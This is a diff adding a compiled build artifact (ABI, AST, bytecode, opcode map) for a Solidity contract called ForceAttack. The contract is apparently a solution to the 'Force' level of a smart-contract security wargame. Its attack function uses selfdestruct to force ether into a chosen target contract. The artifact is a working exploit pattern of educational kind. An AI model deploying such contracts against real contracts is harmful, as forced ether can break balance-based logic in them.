@@ -1,0 +1,840 @@
+{
+  "abi": [
+    {
+      "inputs": [],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address payable",
+          "name": "_contractAddr",
+          "type": "address"
+        }
+      ],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "12": "contracts/07_Force/ForceAttack.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/07_Force/ForceAttack.sol",
+    "exportedSymbols": {
+      "ForceAttack": [
+        377
+      ]
+    },
+    "id": 378,
+    "license": null,
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 362,
+        "literals": [
+          "solidity",
+          "^",
+          "0.6",
+          ".0"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "0:23:12"
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": null,
+        "fullyImplemented": true,
+        "id": 377,
+        "linearizedBaseContracts": [
+          377
+        ],
+        "name": "ForceAttack",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "body": {
+              "id": 365,
+              "nodeType": "Block",
+              "src": "81:2:12",
+              "statements": []
+            },
+            "documentation": null,
+            "id": 366,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 363,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "63:2:12"
+            },
+            "returnParameters": {
+              "id": 364,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "81:0:12"
+            },
+            "scope": 377,
+            "src": "52:31:12",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 375,
+              "nodeType": "Block",
+              "src": "143:44:12",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "id": 372,
+                        "name": "_contractAddr",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 368,
+                        "src": "166:13:12",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      ],
+                      "id": 371,
+                      "name": "selfdestruct",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": -21,
+                      "src": "153:12:12",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
+                        "typeString": "function (address payable)"
+                      }
+                    },
+                    "id": 373,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "153:27:12",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 374,
+                  "nodeType": "ExpressionStatement",
+                  "src": "153:27:12"
+                }
+              ]
+            },
+            "documentation": null,
+            "functionSelector": "d018db3e",
+            "id": 376,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 369,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 368,
+                  "mutability": "mutable",
+                  "name": "_contractAddr",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 376,
+                  "src": "105:29:12",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address_payable",
+                    "typeString": "address payable"
+                  },
+                  "typeName": {
+                    "id": 367,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "105:15:12",
+                    "stateMutability": "payable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address_payable",
+                      "typeString": "address payable"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "104:31:12"
+            },
+            "returnParameters": {
+              "id": 370,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "143:0:12"
+            },
+            "scope": 377,
+            "src": "89:98:12",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          }
+        ],
+        "scope": 378,
+        "src": "25:164:12"
+      }
+    ],
+    "src": "0:190:12"
+  },
+  "bytecode": "608060405260948060116000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063d018db3e14602d575b600080fd5b605060048036036020811015604157600080fd5b50356001600160a01b03166052565b005b806001600160a01b0316fffea2646970667358221220b5102e6efde2cb20736c9b13a4aef414499a69c91726d242d4cba76d12ea98a164736f6c634300060c0033",
+  "bytecodeSha1": "d34af4decf617606af1d524cb2ef72d4d4502399",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.6.12+commit.27d51765"
+  },
+  "contractName": "ForceAttack",
+  "coverageMap": {
+    "branches": {
+      "12": {}
+    },
+    "statements": {
+      "12": {
+        "ForceAttack.attack": {
+          "0": [
+            153,
+            180
+          ]
+        }
+      }
+    }
+  },
+  "dependencies": [],
+  "deployedBytecode": "6080604052348015600f57600080fd5b506004361060285760003560e01c8063d018db3e14602d575b600080fd5b605060048036036020811015604157600080fd5b50356001600160a01b03166052565b005b806001600160a01b0316fffea2646970667358221220b5102e6efde2cb20736c9b13a4aef414499a69c91726d242d4cba76d12ea98a164736f6c634300060c0033",
+  "deployedSourceMap": "25:164:12:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;89:98;;;;;;;;;;;;;;;;-1:-1:-1;89:98:12;-1:-1:-1;;;;;89:98:12;;:::i;:::-;;;166:13;-1:-1:-1;;;;;153:27:12;",
+  "language": "Solidity",
+  "natspec": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "offset": [
+    25,
+    189
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD018DB3E EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x50 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x52 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB5 LT 0x2E PUSH15 0xFDE2CB20736C9B13A4AEF414499A69 0xC9 OR 0x26 0xD2 TIMESTAMP 0xD4 0xCB 0xA7 PUSH14 0x12EA98A164736F6C634300060C00 CALLER ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "MSTORE",
+      "path": "12"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "CALLVALUE",
+      "path": "12"
+    },
+    "6": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "DUP1",
+      "path": "12"
+    },
+    "7": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "ISZERO",
+      "path": "12"
+    },
+    "8": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0xF"
+    },
+    "10": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "JUMPI",
+      "path": "12"
+    },
+    "11": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x0"
+    },
+    "13": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "DUP1",
+      "path": "12"
+    },
+    "14": {
+      "dev": "Cannot send ether to nonpayable function",
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "REVERT",
+      "path": "12"
+    },
+    "15": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "JUMPDEST",
+      "path": "12"
+    },
+    "16": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "POP",
+      "path": "12"
+    },
+    "17": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x4"
+    },
+    "19": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "CALLDATASIZE",
+      "path": "12"
+    },
+    "20": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "LT",
+      "path": "12"
+    },
+    "21": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x28"
+    },
+    "23": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "JUMPI",
+      "path": "12"
+    },
+    "24": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x0"
+    },
+    "26": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "CALLDATALOAD",
+      "path": "12"
+    },
+    "27": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0xE0"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "SHR",
+      "path": "12"
+    },
+    "30": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "DUP1",
+      "path": "12"
+    },
+    "31": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH4",
+      "path": "12",
+      "value": "0xD018DB3E"
+    },
+    "36": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "EQ",
+      "path": "12"
+    },
+    "37": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x2D"
+    },
+    "39": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "JUMPI",
+      "path": "12"
+    },
+    "40": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "JUMPDEST",
+      "path": "12"
+    },
+    "41": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x0"
+    },
+    "43": {
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "DUP1",
+      "path": "12"
+    },
+    "44": {
+      "first_revert": true,
+      "fn": null,
+      "offset": [
+        25,
+        189
+      ],
+      "op": "REVERT",
+      "path": "12"
+    },
+    "45": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "JUMPDEST",
+      "path": "12"
+    },
+    "46": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x50"
+    },
+    "48": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x4"
+    },
+    "50": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "DUP1",
+      "path": "12"
+    },
+    "51": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "CALLDATASIZE",
+      "path": "12"
+    },
+    "52": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "SUB",
+      "path": "12"
+    },
+    "53": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x20"
+    },
+    "55": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "DUP2",
+      "path": "12"
+    },
+    "56": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "LT",
+      "path": "12"
+    },
+    "57": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "ISZERO",
+      "path": "12"
+    },
+    "58": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x41"
+    },
+    "60": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "JUMPI",
+      "path": "12"
+    },
+    "61": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x0"
+    },
+    "63": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "DUP1",
+      "path": "12"
+    },
+    "64": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "REVERT",
+      "path": "12"
+    },
+    "65": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "JUMPDEST",
+      "path": "12"
+    },
+    "66": {
+      "op": "POP"
+    },
+    "67": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "CALLDATALOAD",
+      "path": "12"
+    },
+    "68": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "70": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "72": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "74": {
+      "op": "SHL"
+    },
+    "75": {
+      "op": "SUB"
+    },
+    "76": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "AND",
+      "path": "12"
+    },
+    "77": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "PUSH1",
+      "path": "12",
+      "value": "0x52"
+    },
+    "79": {
+      "fn": "ForceAttack.attack",
+      "jump": "i",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "JUMP",
+      "path": "12"
+    },
+    "80": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "JUMPDEST",
+      "path": "12"
+    },
+    "81": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "STOP",
+      "path": "12"
+    },
+    "82": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        89,
+        187
+      ],
+      "op": "JUMPDEST",
+      "path": "12"
+    },
+    "83": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        166,
+        179
+      ],
+      "op": "DUP1",
+      "path": "12",
+      "statement": 0
+    },
+    "84": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "86": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "88": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "90": {
+      "op": "SHL"
+    },
+    "91": {
+      "op": "SUB"
+    },
+    "92": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        153,
+        180
+      ],
+      "op": "AND",
+      "path": "12"
+    },
+    "93": {
+      "fn": "ForceAttack.attack",
+      "offset": [
+        153,
+        180
+      ],
+      "op": "SELFDESTRUCT",
+      "path": "12"
+    }
+  },
+  "sha1": "c2344527311ba654f2f19963178b741afb074bc5",
+  "source": "pragma solidity ^0.6.0;\n\ncontract ForceAttack {\n    constructor() public payable {}\n\n    function attack(address payable _contractAddr) public {\n        selfdestruct(_contractAddr);\n    }\n}\n",
+  "sourceMap": "25:164:12:-:0;;;;;;;;;",
+  "sourcePath": "contracts/07_Force/ForceAttack.sol",
+  "type": "contract"
+}
